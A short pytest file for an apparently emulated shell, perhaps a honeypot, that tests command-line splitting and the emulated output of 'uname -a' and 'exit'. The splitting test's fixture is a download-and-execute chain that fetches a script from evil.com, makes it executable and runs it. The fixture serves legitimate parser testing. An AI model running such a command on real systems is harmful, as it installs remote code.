"""Unit tests for command line splitting and emulated shell execution"""

import pytest
from shell.shell import split_command_line, process_command_line


def test_command_splitting():
    cmd = "cd /tmp && wget http://evil.com/x.sh; chmod +x x.sh || ./x.sh"
    subcmds = split_command_line(cmd)
    assert len(subcmds) == 4
    assert subcmds[0] == "cd /tmp"
    assert subcmds[1] == "wget http://evil.com/x.sh"
    assert subcmds[2] == "chmod +x x.sh"
    assert subcmds[3] == "./x.sh"


def test_single_command_execution():
    history = []
    output, new_cwd, should_exit = process_command_line(
        "uname -a", "/root", "root", "test_sid", "127.0.0.1", history
    )
    assert "Linux" in output
    assert not should_exit

    output, new_cwd, should_exit = process_command_line(
        "exit", "/root", "root", "test_sid", "127.0.0.1", history
    )
    assert should_exit
